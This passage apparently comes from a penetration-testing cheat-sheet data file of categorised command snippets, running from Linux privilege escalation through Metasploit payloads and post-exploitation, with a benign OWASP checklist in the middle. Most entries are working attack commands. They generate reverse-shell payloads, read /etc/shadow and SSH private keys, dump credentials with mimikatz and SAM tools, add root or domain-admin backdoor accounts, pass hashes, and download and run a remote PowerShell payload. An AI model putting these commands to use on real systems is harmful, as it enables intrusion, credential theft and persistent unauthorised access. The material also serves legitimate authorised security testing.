root@192.168.1.7    # Local Port\nssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port\n\n# mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe\nmknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay\nmknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)\nmknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)\n\n"], ["LinuxPrivilegeEsc", "Is tunnelling possible? Send commands locally, remotely", "ssh -D 127.0.0.1:9050 -N [username]@[ip] \nproxychains ifconfig\n\n"], ["LinuxPrivilegeEsc", "Confidential Information & Users", "Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?\nid\nwho\nw\nlast \ncat /etc/passwd | cut -d:    # List of users\ngrep -v -E \"^#\" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users\nawk -F: '($3 == \"0\") {print}' /etc/passwd   # List of super users\ncat /etc/sudoers\nsudo -l \n\n"], ["LinuxPrivilegeEsc", "What sensitive files can be found?", "cat /etc/passwd\ncat /etc/group\ncat /etc/shadow\nls -alh /var/mail/\n\n"], ["LinuxPrivilegeEsc", "Anything \"interesting\" in the home directorie(s)? If it's possible to access", "ls -ahlR /root/\nls -ahlR /home/\n\n"], ["LinuxPrivilegeEsc", "Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords", "cat /var/apache2/config.inc\ncat /var/lib/mysql/mysql/user.MYD \ncat /root/anaconda-ks.cfg\n\n"], ["LinuxPrivilegeEsc", "What has the user being doing? Is there any password in plain text? What have they been edting?", "cat ~/.bash_history\ncat ~/.nano_history\ncat ~/.atftp_history\ncat ~/.mysql_history \ncat ~/.php_history\n\n"], ["LinuxPrivilegeEsc", "What user information can be found?", "cat ~/.bashrc\ncat ~/.profile\ncat /var/mail/root\ncat /var/spool/mail/root\n\n"], ["LinuxPrivilegeEsc", "Can private-key information be found?", "cat ~/.ssh/authorized_keys\ncat ~/.ssh/identity.pub\ncat ~/.ssh/identity\ncat ~/.ssh/id_rsa.pub\ncat ~/.ssh/id_rsa\ncat ~/.ssh/id_dsa.pub\ncat ~/.ssh/id_dsa\ncat /etc/ssh/ssh_config\ncat /etc/ssh/sshd_config\ncat /etc/ssh/ssh_host_dsa_key.pub\ncat /etc/ssh/ssh_host_dsa_key\ncat /etc/ssh/ssh_host_rsa_key.pub\ncat /etc/ssh/ssh_host_rsa_key\ncat /etc/ssh/ssh_host_key.pub\ncat /etc/ssh/ssh_host_key\n\n"], ["LinuxPrivilegeEsc", "File Systems", "Which configuration files can be written in /etc/? Able to reconfigure a service?\nls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone\nls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner\nls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group\nls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null          # Other\n\nfind /etc/ -readable -type f 2>/dev/null                         # Anyone\nfind /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone \n\n"], ["LinuxPrivilegeEsc", "What can be found in /var/ ?", "ls -alh /var/log\nls -alh /var/mail\nls -alh /var/spool\nls -alh /var/spool/lpd \nls -alh /var/lib/pgsql\nls -alh /var/lib/mysql\ncat /var/lib/dhcp3/dhclient.leases\n\n"], ["LinuxPrivilegeEsc", "Any settings/files (hidden) on website? Any settings file with database information?", "ls -alhR /var/www/\nls -alhR /srv/www/htdocs/ \nls -alhR /usr/local/www/apache22/data/\nls -alhR /opt/lampp/htdocs/ \nls -alhR /var/www/html/\n\n"], ["LinuxPrivilegeEsc", "Is there anything in the log file(s) (Could help with \"Local File Includes\"!)", "# http://www.thegeekstuff.com/2011/08/linux-var-log-files/\ncat /etc/httpd/logs/access_log\ncat /etc/httpd/logs/access.log\ncat /etc/httpd/logs/error_log\ncat /etc/httpd/logs/error.log\ncat /var/log/apache2/access_log\ncat /var/log/apache2/access.log\ncat /var/log/apache2/error_log\ncat /var/log/apache2/error.log\ncat /var/log/apache/access_log\ncat /var/log/apache/access.log\ncat /var/log/auth.log\ncat /var/log/chttp.log\ncat /var/log/cups/error_log\ncat /var/log/dpkg.log\ncat /var/log/faillog\ncat /var/log/httpd/access_log\ncat /var/log/httpd/access.log\ncat /var/log/httpd/error_log\ncat /var/log/httpd/error.log\ncat /var/log/lastlog\ncat /var/log/lighttpd/access.log\ncat /var/log/lighttpd/error.log\ncat /var/log/lighttpd/lighttpd.access.log\ncat /var/log/lighttpd/lighttpd.error.log\ncat /var/log/messages\ncat /var/log/secure\ncat /var/log/syslog\ncat /var/log/wtmp\ncat /var/log/xferlog\ncat /var/log/yum.log\ncat /var/run/utmp\ncat /var/webmin/miniserv.log\ncat /var/www/logs/access_log\ncat /var/www/logs/access.log\nls -alh /var/lib/dhcp3/\nls -alh /var/log/postgresql/\nls -alh /var/log/proftpd/\nls -alh /var/log/samba/\n# auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp\n\n"], ["LinuxPrivilegeEsc", "If commands are limited, you break out of the \"jail\" shell?", "python -c 'import pty;pty.spawn(\"/bin/bash\")'\necho os.system('/bin/bash')\n/bin/sh -i\n\n"], ["LinuxPrivilegeEsc", "How are file-systems mounted?", "mount\ndf -h\n\n"], ["LinuxPrivilegeEsc", "Are there any unmounted file-systems?", "cat /etc/fstab\n\n"], ["LinuxPrivilegeEsc", "What \"Advanced Linux File Permissions\" are used? Sticky bits, SUID & GUID", "find / -perm -1000 -type d 2>/dev/null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here\nfind / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.\nfind / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.\n\nfind / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID\nfor i in `locate -r \"bin$\"`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)\n\n# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)\nfind / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null \n\n"], ["LinuxPrivilegeEsc", "Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm", "find / -writable -type d 2>/dev/null        # world-writeable folders\nfind / -perm -222 -type d 2>/dev/null      # world-writeable folders\nfind / -perm -o+w -type d 2>/dev/null    # world-writeable folders\n\nfind / -perm -o+x -type d 2>/dev/null    # world-executable folders\n\nfind / \\( -perm -o+w -perm -o+x \\) -type d 2>/dev/null   # world-writeable & executable folders\n\n"], ["LinuxPrivilegeEsc", "Any \"problem\" files? Word-writeable, \"nobody\" files", "find / -xdev -type d \\( -perm -0002 -a ! -perm -1000 \\) -print   # world-writeable files\nfind /dir -xdev \\( -nouser -o -nogroup \\) -print   # Noowner files\n\n"], ["LinuxPrivilegeEsc", "Preparation & Finding Exploit Code", "What development tools/languages are installed/supported?\nfind / -name perl*\nfind / -name python*\nfind / -name gcc* \nfind / -name cc\n\n"], ["LinuxPrivilegeEsc", "How can files be uploaded?", "find / -name wget\nfind / -name nc*\nfind / -name netcat*\nfind / -name tftp* \nfind / -name ftp \n\n"], ["LinuxPrivilegeEsc", "Finding exploit code", "http://www.exploit-db.com\nhttp://1337day.com\nhttp://www.securiteam.com\nhttp://www.securityfocus.com\nhttp://www.exploitsearch.net\nhttp://metasploit.com/modules/\nhttp://securityreason.com\nhttp://seclists.org/fulldisclosure/\nhttp://www.google.com \n\n"], ["LinuxPrivilegeEsc", "Finding more information regarding the exploit", "http://www.cvedetails.com\nhttp://packetstormsecurity.org/files/cve/[CVE]\nhttp://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]\nhttp://www.vulnview.com/cve-details.php?cvename=[CVE]\n\n"], ["LinuxPrivilegeEsc", "(Quick) \"Common\" exploits. Warning. Pre-compiled binaries files. Use at your own risk", "http://tarantula.by.ru/localroot/\nhttp://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/"], ["LocalSamDump", "Find windows passwords", "fdisk -l\n\nmount -t ntfs /dev/sda1 /mnt\n\ndf -k\n\ncd /mnt\nls\ncd WINDOWS/system32/config\n\nls\nbkhive system /root/hive.txt\nsamdump2 SAM /root/hive.txt > /root/hash.txt\n\njohn /root/hash.txt -format=nt2 -users=Administrator\ncd /root/.john\nls -l\ncat john.pot"], ["MetasploitPayloads", "List payloads", "msfvenom -l\n\n"], ["MetasploitPayloads", "Binaries", "Linux\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf\n\nWindows\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe\n\nMac\nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho\n\n"], ["MetasploitPayloads", "Web Payloads", "PHP\nmsfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php\ncat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >> shell.php\n\nASP\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp\n\nJSP\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp\n\nWAR\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war\n\n"], ["MetasploitPayloads", "Scripting Payloads", "Python\nmsfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py\n\nBash\nmsfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh\n\nPerl\nmsfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl\n\n"], ["MetasploitPayloads", "Shellcode", "For all shellcode see 'msfvenom \u00e2\u20ac\u201chelp-formats' for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.\n\nLinux Based Shellcode\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>\n\nWindows Based Shellcode\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>\n\nMac Based Shellcode\nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>\n\n"], ["MetasploitPayloads", "Handlers", "Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.\n\nuse exploit/multi/handler\nset PAYLOAD <Payload name>\nset LHOST <LHOST value>\nset LPORT <LPORT value>\nset ExitOnSession false\nexploit -j -z\n\nOnce the required values are completed the following command will execute your handler \u00e2\u20ac\u201c \u00e2\u20ac\u02dcmsfconsole -L -r \u00e2\u20ac\u02dc"], ["MobileAppTesting", "", ""], ["MobileAppTesting", "Notes", "[>] Application file type - x.ipa\n\n[>] Easy way:\n\n- Place attacking machine and apple device on wireless network with app installed.\n- Email burps .cer to apple device and install\n- Start burp and disable firewall on listening machine.\n- Change proxy settings on apple device to point to listening burp machine/port.\n\n"], ["MobileAppTesting", "Mobile Application Test Notes (Android)", "\n[>] Create a virtual device:\n\t[-] android avd\n\n[>] Start the emulator:\n\t[-] emulator \u00e2\u20ac\u201cavd testavd\n\n[>] Install the application:\n\t[-] adb install <path of the .apk file>\n\n[>] Open Burp Suite and navigate to Proxy->Options,\n\t[-] Edit proxy listeners \u00e2\u20ac\u201c enter \u00e2\u20ac\u02dcport\u00e2\u20ac\u2122 as 8080, disable \u00e2\u20ac\u02dcloopback only\u00e2\u20ac\u2122 and select \u00e2\u20ac\u02dcsupport invisible\u00e2\u20ac\u2122.\n\n[>] Start the emulator and proxy:\n\t[-] emulator \u00e2\u20ac\u201cavd testavd \u00e2\u20ac\u201chttp-proxy http://localhost:8080\n\n[>] Download and install burp certificate (.crt) onto the emulator using the push shell command.\n\n\n"], ["MobileAppTesting", "Notes (Android)", "- Application file type - x.apk\n\n"], ["MobileAppTesting", "Extra info", "Install Certs: http://www.realmb.com/droidCert/\nSQLite Database Browser: http://sourceforge.net/projects/sqlitebrowser/?source=pdlp\n\nhttp://www.mcafee.com/uk/resources/white-papers/foundstone/wp-pen-testing-android-apps.pdf"], ["MSFPostExploitation", "Meterpreter Shell", "meterpreter > sysinfo\n\nmeterpreter > getuid\n\nmeterpreter > getsystem\n\nmeterpreter > hashdump\n\nmeterpreter > load/use mimikatz\n\nkerberos          Attempt to retrieve kerberos creds\nlivessp           Attempt to retrieve livessp creds\nmimikatz_command  Run a custom commannd\nmsv               Attempt to retrieve msv creds (hashes)\nssp               Attempt to retrieve ssp creds\ntspkg             Attempt to retrieve tspkg creds\nwdigest           Attempt to retrieve wdigest creds\n\nmeterpreter > wdigest\n\nmeterpreter > use incognito\nmeterpreter > list_tokens -u\nmeterpreter > impersonate_token SERV-2K3\\\\Administrator\nexecute -f cmd.exe -i -t"], ["Networking", "Setting up an Ethernet bridge in Ubuntu/Kali Linux", "\n# Install bridge-utils\nsudo apt-get install bridge-utils\n\n# Disable network-manager + firewall\n\n# Configuration\n\nifconfig\nifconfig eth0 0.0.0.0\nifconfig eth1 0.0.0.0\nbrctl addbr br0\nbrctl addif br0 eth0\nbrctl addif br0 eth1\nifconfig mybridge up\ndhclient br0 on devices\n\nsudo tcpdump -i mybridge"], ["Oracle", "Oracle Penetration Testing", "Tools within Kali:\n\noscanner\nroot@kali:~# oscanner -s 192.168.1.15 -P 1040\n\nsidguess\nroot@kali:~# sidguess -i 192.168.1.205 -d /usr/share/wordlists/metasploit/unix_users.txt\n\ntnscmd10g\nroot@kali:~# tnscmd10g version -h 192.168.1.20\n\nNmap\nnmap -p 1521 -A 192.168.15.205\n\nNmap nse scripts\nMetasploit auxiliaries"], ["OWASPCheckList", "Information Gathering", "Manually explore the site\nSpider/crawl for missed or hidden content\nCheck for files that expose content, such as robots.txt, sitemap.xml, .DS_Store\nCheck the caches of major search engines for publicly accessible sites\nCheck for differences in content based on User Agent (eg, Mobile sites, access as a Search engine Crawler)\nPerform Web Application Fingerprinting\nIdentify technologies used\nIdentify user roles\nIdentify application entry points\nIdentify client-side code\nIdentify multiple versions/channels (e.g. web, mobile web, mobile app, web services)\nIdentify co-hosted and related applications\nIdentify all hostnames and ports\nIdentify third-party hosted content\n\n"], ["OWASPCheckList", "Configuration Management", "Check for commonly used application and administrative URLs\nCheck for old, backup and unreferenced files\nCheck HTTP methods supported and Cross Site Tracing (XST)\nTest file extensions handling\nTest for security HTTP headers (e.g. CSP, X-Frame-Options, HSTS)\nTest for policies (e.g. Flash, Silverlight, robots)\nTest for non-production data in live environment, and vice-versa\nCheck for sensitive data in client-side code (e.g. API keys, credentials)\n\n"], ["OWASPCheckList", "Secure Transmission", "Check SSL Version, Algorithms, Key length\nCheck for Digital Certificate Validity (Duration, Signature and CN)\nCheck credentials only delivered over HTTPS\nCheck that the login form is delivered over HTTPS\nCheck session tokens only delivered over HTTPS\nCheck if HTTP Strict Transport Security (HSTS) in use\n\n"], ["OWASPCheckList", "Authentication", "Test for user enumeration\nTest for authentication bypass\nTest for bruteforce protection\nTest password quality rules\nTest remember me functionality\nTest for autocomplete on password forms/input\nTest password reset and/or recovery\nTest password change process\nTest CAPTCHA\nTest multi factor authentication\nTest for logout functionality presence\nTest for cache management on HTTP (eg Pragma, Expires, Max-age)\nTest for default logins\nTest for user-accessible authentication history\nTest for out-of channel notification of account lockouts and successful password changes\nTest for consistent authentication across applications with shared authentication schema / SSO\n\n"], ["OWASPCheckList", "Session Management", "Establish how session management is handled in the application (eg, tokens in cookies, token in URL)\nCheck session tokens for cookie flags (httpOnly and secure)\nCheck session cookie scope (path and domain)\nCheck session cookie duration (expires and max-age)\nCheck session termination after a maximum lifetime\nCheck session termination after relative timeout\nCheck session termination after logout\nTest to see if users can have multiple simultaneous sessions\nTest session cookies for randomness\nConfirm that new session tokens are issued on login, role change and logout\nTest for consistent session management across applications with shared session management\nTest for session puzzling\nTest for CSRF and clickjacking\n\n"], ["OWASPCheckList", "Authorization", "Test for path traversal\nTest for bypassing authorization schema\nTest for vertical Access control problems (a.k.a. Privilege Escalation)\nTest for horizontal Access control problems (between two users at the same privilege level)\nTest for missing authorization\n\n"], ["OWASPCheckList", "Data Validation", "Test for Reflected Cross Site Scripting\nTest for Stored Cross Site Scripting\nTest for DOM based Cross Site Scripting\nTest for Cross Site Flashing\nTest for HTML Injection\nTest for SQL Injection\nTest for LDAP Injection\nTest for ORM Injection\nTest for XML Injection\nTest for XXE Injection\nTest for SSI Injection\nTest for XPath Injection\nTest for XQuery Injection\nTest for IMAP/SMTP Injection\nTest for Code Injection\nTest for Expression Language Injection\nTest for Command Injection\nTest for Overflow (Stack, Heap and Integer)\nTest for Format String\nTest for incubated vulnerabilities\nTest for HTTP Splitting/Smuggling\nTest for HTTP Verb Tampering\nTest for Open Redirection\nTest for Local File Inclusion\nTest for Remote File Inclusion\nCompare client-side and server-side validation rules\nTest for NoSQL injection\nTest for HTTP parameter pollution\nTest for auto-binding\nTest for Mass Assignment\nTest for NULL/Invalid Session Cookie\n\n"], ["OWASPCheckList", "Denial of Service", "Test for anti-automation\nTest for account lockout\nTest for HTTP protocol DoS\nTest for SQL wildcard DoS\n\n"], ["OWASPCheckList", "Business Logic", "Test for feature misuse\nTest for lack of non-repudiation\nTest for trust relationships\nTest for integrity of data\nTest segregation of duties\n\n"], ["OWASPCheckList", "Cryptography", "Check if data which should be encrypted is not\nCheck for wrong algorithms usage depending on context\nCheck for weak algorithms usage\nCheck for proper use of salting\nCheck for randomness functions\n\n"], ["OWASPCheckList", "Risky Functionality - File Uploads", "Test that acceptable file types are whitelisted\nTest that file size limits, upload frequency and total file counts are defined and are enforced\nTest that file contents match the defined file type\nTest that all file uploads have Anti-Virus scanning in-place.\nTest that unsafe filenames are sanitised\nTest that uploaded files are not directly accessible within the web root\nTest that uploaded files are not served on the same hostname/port\nTest that files and other media are integrated with the authentication and authorisation schemas\n\n"], ["OWASPCheckList", "Risky Functionality - Card Payment", "Test for known vulnerabilities and configuration issues on Web Server and Web Application\nTest for default or guessable password\nTest for non-production data in live environment, and vice-versa\nTest for Injection vulnerabilities\nTest for Buffer Overflows\nTest for Insecure Cryptographic Storage\nTest for Insufficient Transport Layer Protection\nTest for Improper Error Handling\nTest for all vulnerabilities with a CVSS v2 score > 4.0\nTest for Authentication and Authorization issues\nTest for CSRF\n\n"], ["OWASPCheckList", "HTML 5", "Test Web Messaging\nTest for Web Storage SQL injection\nCheck CORS implementation\nCheck Offline Web Application"], ["PenTesting", "", ""], ["PenTesting", "Internet Host/Network Enumeration", "- WHOIS Querying\nwhois www.domain.com\n\n- Resolve an IP using DIG\ndig @8.8.8.8 securitymuppets.com\n\n- Find Mail servers for a domain\ndig @8.8.8.8 securitymuppets.com -t mx\n\n- Find any DNS records for a domain\ndig @8.8.8.8 securitymuppets.com -t any\n\n- Zone Transfer\ndig @192.168.100.2 securitymuppets.com -t axfr\nhost -l securitymuppets.com 192.168.100.2\nnslookup / ls -d domain.com.local\n\n- Fierce\nfierce -dns <domain> -file <output_file>\nfierce -dns <domain> -dnsserver <server>\nfierce -range <ip-range> -dnsserver <server>\nfierce -dns <domain> -wordlist <wordlist>\n\n"], ["PenTesting", "IP Network scanning", "\n- ARP Scan\narp-scan 192.168.50.8/28 -I eth0\n\n- NMAP Scans\n\n- Nmap ping scan\nsudo nmap \u00e2\u20ac\u201csn -oA nmap_pingscan 192.168.100.0/24 (-PE)\n\n- Nmap SYN/Top 100 ports Scan\nnmap -sS -F -oA nmap_fastscan 192.168.0.1/24\n\n- Nmap SYN/Version All port Scan - ## Main Scan\nsudo nmap -sV -PN -p0- -T4 -A --stats-every 60s --reason -oA nmap_scan 192.168.0.1/24\n\n- Nmap SYN/Version No Ping All port Scan\nsudo nmap -sV -Pn -p0- --exclude 192.168.0.1 --reason -oA nmap_scan 192.168.0.1/24\n\n- Nmap UDP All port scan - ## Main Scan\nsudo nmap -sU -p0- --reason --stats-every 60s --max-rtt-timeout=50ms --max-retries=1 -oA nmap_scan 192.168.0.1/24\n\n- Nmap UDP/Fast Scan\nnmap -F -sU -oA nmap_UDPscan 192.168.0.1/24\n\n- Nmap Top 1000 port UDP Scan\nnmap -sU -oA nmap_UDPscan 192.168.0.1/24\n\n- HPING3 Scans\nhping3 -c 3 -s 53 -p 80 -S 192.168.0.1\nOpen = flags = SA\nClosed = Flags = RA\nBlocked = ICMP unreachable\nDropped = No response\n\n- Source port scanning\nnmap -g <port> (88 (Kerberos) port 53 (DNS) or 67 (DHCP))\nSource port also doesn't work for OS detection.\n\n- Speed settings\n-n \t\t\t\t\tDisable DNS resolution \n-sS \t\t\t\tTCP SYN (Stealth) Scan \n-Pn \t\t\t\tDisable host discovery\n-T5\t\t\t\t\tInsane time template\n--min-rate 1000\t\t1000 packets per second\n--max-retries 0\t\tDisable retransmission of timed-out probes\n\n-------------------------------------------------------------------------- Cisco/Networking Commands\n\n? - Help\n> - User mode\n# - Privileged mode\nrouter(config)# - Global Configuration mode\n\nenable secret more secure than enable password.\n\nFor example, in the configuration command:\nenable secret 5 $1$iUjJ$cDZ03KKGh7mHfX2RSbDqP.\nThe enable secret has been hashed with MD5, whereas in the command:\nusername jdoe password 7 07362E590E1B1C041B1E124C0A2F2E206832752E1A01134D\nThe password has been encrypted using the weak reversible algorithm.\n\nenable - Change to privileged mode to view configs\nconfig terminal/config t - Change to global config mode to modify\n\n#show version - Gives you the router's configuration register (Firmware)\n#show running-config - Shows the router, switch, or firewall's current configuration\n#show ip route - show the router's routing table\n#show tech-support - Dump config but obscure passwords\n\n"], ["PenTesting", "Remote Information Services", "- DNS\nZone Transfer - host -l securitymuppets.com 192.168.100.2\nMetasploit Auxiliarys:\nauxiliary/gather/enum_dns\nuse auxiliary/gather/dns...\n\n- Finger - Enumerate Users\nfinger @192.168.0.1\nfinger -l -p user@ip-address\nauxiliary/scanner/finger/finger_users\n\n- NTP\nMetasploit Auxiliarys\n\n- SNMP\nonesixtyone -c /usr/share/doc/onesixtyone/dict.txt\nMetasploit Module snmp_enum\nsnmpcheck -t snmpservice\n\n- rservices\nrwho 192.168.0.1\nrlogin -l root 192.168.0.17\n\n- RPC Services\nrpcinfo -p\nEndpoint_mapper metasploit\n\n"], ["PenTesting", "Web Services", "- WebDAV\nMetasploit Auxiliarys\nUpload shell to Vulnerable WebDAV directory:\nmsfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.20 LPORT=4444 R | msfencode -t asp -o shell.asp\ncadaver http://192.168.0.60/\nput shell.asp shell.txt\ncopy shell.txt shell.asp;.txt\nStart reverse handler - browse to http://192.168.0.60/shell.asp;.txt\n\n"], ["PenTesting", "Windows Networking Services", "- Get Domain Information:\nnltest /DCLIST:DomainName\nnltest /DCNAME:DomainName\nnltest /DSGETDC:DomainName\n\n- Netbios Enumeration\nnbtscan -r 192.168.0.1-100\nnbtscan -f hostfiles.txt\n\n- enum4linux\n\n- RID Cycling\nuse auxiliary/scanner/smb/smb_lookupsid\n\n- Null Session in Windows\nnet use \\\\192.168.0.1\\IPC$ \"\" /u:\"\"\n\n- Null Session in Linux\nsmbclient -L //192.168.99.131\n\n"], ["PenTesting", "Accessing Email Services", "Metasploit Auxiliarys\n\n- SMTP Open Relay Commands\n\n[-] ncat -C 86.54.23.178 25\n[-] HELO mail.co.uk\n[-] MAIL FROM: <Attacker@mail.co.uk>\n[-] RCPT TO: <Victim@email.com>\n[-] DATA\nTest Email - some malicious stuff!\n\n"], ["PenTesting", "VPN Testing", "- ike-scan\nike-scan 192.168.207.134\nsudo ike-scan -A 192.168.207.134\nsudo ike-scan -A 192.168.207.134 --id=myid -P192-168-207-134key\n\n- pskcrack\npsk-crack -b 5 192-168-207-134key\npsk-crack -b 5 --charset=\"01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\" 192-168-207-134key\npsk-crack -d /path/to/dictionary 192-168-207-134key\n\n"], ["PenTesting", "Unix RPC", "- NFS Mounts\n\nMetasploit : auxiliary/scanner/nfs/nfsmount\n\nrpcinfo -p 192.168.0.10\n\nshowmount -e 192.168.0.10\nmount 192.168.0.10:/secret /mnt/share/\n\nssh-keygen\nmkdir /tmp/r00t\nmount -t nfs 192.168.0.10:/secret /mnt/share/\ncat ~/.ssh/id_rsa.pub >> /mnt/share/root/.ssh/authorized_keys\numount /mnt/share\nssh root@192.168.0.10\n\n"], ["PenTesting", "Post Exploitation", "- Command prompt access on Windows Host\n\npth-winexe -U Administrator%<hash> //<host ip> cmd.exe\n\n- Add Linux User\n/usr/sbin/useradd \u00e2\u20ac\u201cg 0 \u00e2\u20ac\u201cu 0 \u00e2\u20ac\u201co user\necho user:password | /usr/sbin/chpasswd\n\n- Add Windows User\nnet user username password@1 /add\nnet localgroup administrators username /add\n\n- Solaris Commands\nuseradd -o user\npasswd user\nusermod -R root user\n\n- Dump remote SAM:\nPwDump.exe -u localadmin 192.168.0.1\n\n- Mimikatz\nmimikatz # privilege::debug\nmimikatz # sekurlsa::logonPasswords full\n\n- Meterpreter\nmeterpreter> run winenum\nmeterpreter> use post/windows/gather/smart_hashdump\n\nmeterpreter > use incognito\nmeterpreter > list_tokens -u\nmeterpreter > impersonate_token TVM\\domainadmin\nmeterpreter > add_user hacker password1 -h 192.168.0.10\nmeterpreter > add_group_user \"Domain Admins\" hacker -h 192.168.0.10\n\nmeterpreter > load mimikatz\nmeterpreter > wdigest\nmeterpreter > getWdigestPasswords\nMigrate if does not work!\n\n- Kitrap0d\nDownload vdmallowed.exe and vdmexploit.dll to victim\nRun vdmallowed.exe to execute system shell\n\n- Windows Information\nOn Windows:\nipconfig /all\nsysteminfo\nnet localgroup administrators\nnet view\nnet view /domain\n\n- SSH Tunnelling\nRemote forward port 222\nssh -R 127.0.0.1:4444:10.1.1.251:222 -p 443 root@192.168.10.118\n\n"], ["PenTesting", "Metasploit", "\n----------------- [-] Metasploit Pivot\n\nCompromise 1st machine\n\n# meterpreter> run arp_scanner -r 10.10.10.0/24\nroute add 10.10.10.10 255.255.255.248 <session>\nuse auxiliary/scanner/portscan/tcp\nuse bind shell\n\nor run autoroute:\n\n# meterpreter > ipconfig\n# meterpreter > run autoroute -s 10.1.13.0/24\n# meterpreter > getsystem\n# meterpreter > run hashdump\n# use auxiliary/scanner/portscan/tcp\n# msf auxiliary(tcp) > use exploit/windows/smb/psexec \n\nor port forwarding:\n# meterpreter > run autoroute -s 10.1.13.0/24\n# use auxiliary/scanner/portscan/tcp\n# meterpreter > portfwd add -l <listening port> -p <remote port> -r <remote/internal host>\n\nor socks proxy:\nroute add 10.10.10.10 255.255.255.248 <session>\nuse auxiliary/server/socks4a\nAdd proxy to /etc/proxychains.conf\nproxychains nmap -sT -T4 -Pn 10.10.10.50\nsetg socks4:127.0.0.1:1080\n\n----------------- [-] Pass the hash\n\nIf NTML only:\n00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c\n\nSTATUS_ACCESS_DENIED (Command=117 WordCount=0):\nThis can be remedied by navigating to the registry key, \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" on the target systems and setting the value of \"RequireSecuritySignature\" to \"0\"\n\nRun hashdump on the first compromised machine:\nrun post/windows/gather/hashdump\n\nRun Psexec module and specify the hash:\nuse exploit/windows/smb/psexec\n\n----------------- [-] Enable RDP:\nmeterpreter > run getgui -u hacker -p s3cr3t\nClean up command: meterpreter > run multi_console_command -rc /root/.msf3/logs/scripts/getgui/clean_up__20110112.2448.rc\n\n----------------- [-] AutoRunScript\nAutomatically run scripts before exploiation:\nset AutoRunScript \"migrate explorer.exe\"\n\n- Set up SOCKS proxy in MSF\n\n- Run a post module against all sessions\nresource /usr/share/metasploit-framework/scripts/resource/run_all_post.rc\n\n- Find local subnets 'Whilst in meterpreter shell'\nmeterpreter > run get_local_subnets\n\n# Add the correct Local host and Local port parameters\necho \"Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.0.7 -Lport 443 -Force\" >> /var/www/payload\n\n# Set up psexec module on metasploit\nauxiliary/admin/smb/psexec_command\nset command powershell -Exec Bypass -NoL -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString(\\'http://192.168.0.9/payload\\')\n\n# Start reverse Handler to catch the reverse connection\nModule options (exploit/multi/handler):\nPayload options (windows/meterpreter/reverse_https):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique: seh, thread, process, none\n   LHOST     192.168.0.9      yes       The local listener hostname\n   LPORT     443              yes       The local listener port\n\n# Show evasion module options\nshow evasion\n\n- Metasploit Shellcode\nmsfvenom -p windows/shell_bind_tcp -b 